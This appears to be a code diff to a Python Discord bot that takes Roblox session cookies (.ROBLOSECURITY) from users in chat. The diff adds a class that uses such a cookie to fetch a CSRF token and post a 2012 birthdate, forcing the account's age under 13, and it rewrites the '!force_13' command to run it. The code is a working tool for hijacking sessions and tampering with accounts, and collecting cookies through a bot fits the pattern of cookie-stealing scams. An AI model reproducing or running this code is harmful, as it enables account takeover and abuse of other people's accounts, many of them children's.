@@ -21,6 +21,43 @@ def home():
 # Get the port from the environment or use 8080
 PORT = int(os.getenv("PORT", 8080))
 
+# Roblox age changer using cookie
+class ForceAgeBypass:
+    def __init__(self, cookie: str):
+        self.cookie = cookie
+        self.session = requests.Session()
+        self.session.cookies[".ROBLOSECURITY"] = self.cookie
+        self.xcsrf_token = None
+
+    def get_csrf_token(self):
+        res = self.session.post("https://auth.roblox.com/v2/logout")
+        self.xcsrf_token = res.headers.get("x-csrf-token")
+        return self.xcsrf_token is not None
+
+    def change_age(self):
+        if not self.get_csrf_token():
+            return "Failed to get CSRF token. Invalid cookie?"
+
+        headers = {
+            "x-csrf-token": self.xcsrf_token,
+            "Content-Type": "application/json"
+        }
+
+        payload = {
+            "birthdate": "2012-01-01"
+        }
+
+        res = self.session.post(
+            "https://accountsettings.roblox.com/v1/birthdate",
+            headers=headers,
+            json=payload
+        )
+
+        if res.status_code == 200:
+            return "Successfully forced age under 13."
+        else:
+            return f"Failed to change age. Response: {res.text}"
+
 # Roblox-related functionality
 class Bypass:
     def __init__(self, cookie: str) -> None:
@@ -246,51 +283,27 @@ async def full(ctx, cookie=None):
         embedVar = nextcord.Embed(title=":x: Error", description="", color=0xFFFF00)
         embedVar.add_field(name="Error: ", value='```'+response.text+'```', inline=False)
         await ctx.send(embed=embedVar)
-        
-@bot.command()
-@commands.cooldown(1, 10, commands.BucketType.user)
-async def force(ctx, cookie: str, password: str):
-    try:
-        # Step 1: Authenticate the cookie and password
-        bypasser = Bypass(cookie)
-        new_cookie = bypasser.start_process()
+ 
 
-        if "Error" in new_cookie:
-            await ctx.send(f"Bypass failed: {new_cookie}")
+# Age change command
+@bot.command(name="force_13")
+async def force(ctx, *, input: str):
+    try:
+        args = dict(item.split(":", 1) for item in input.split() if ":" in item)
+        cookie = args.get("cookie", "").strip()
+
+        if not cookie:
+            await ctx.send("Please provide the cookie like: `!force_13 cookie: your_cookie_here`")
             return
 
-        # Step 2: Get fresh CSRF token with new cookie
-        xcsrf_token = bypasser.get_csrf_token()
-
-        headers = {
-            "x-csrf-token": xcsrf_token,
-            "Content-Type": "application/json",
-            "User-Agent": "Roblox/WinInet"
-        }
-
-        # Step 3: Change the birthdate using the provided cookie and password
-        response = requests.post(
-            "https://accountinformation.roblox.com/v1/birthdate",
-            headers=headers,
-            cookies={".ROBLOSECURITY": new_cookie},
-            json={
-                "birthMonth": 1,
-                "birthDay": 1,
-                "birthYear": 2012  # Customize this for age change
-            }
-        )
-
-        # Step 4: Check if CAPTCHA challenge is required
-        if response.status_code == 200:
-            await ctx.send("Successfully changed account age.")
-        elif "challenge" in response.text.lower():
-            # Suppress the challenge error message
-            await ctx.send("Age change failed due to a security challenge.")
-        else:
-            await ctx.send(f"Failed to change age. Roblox responded with: {response.text}")
+        bypass = ForceAgeBypass(cookie)
+        result = bypass.change_age()
+        await ctx.send(result)
 
     except Exception as e:
         await ctx.send(f"An error occurred: {str(e)}")
+        
+   
 
 # Start Flask server and bot together
 if __name__ == "__main__":
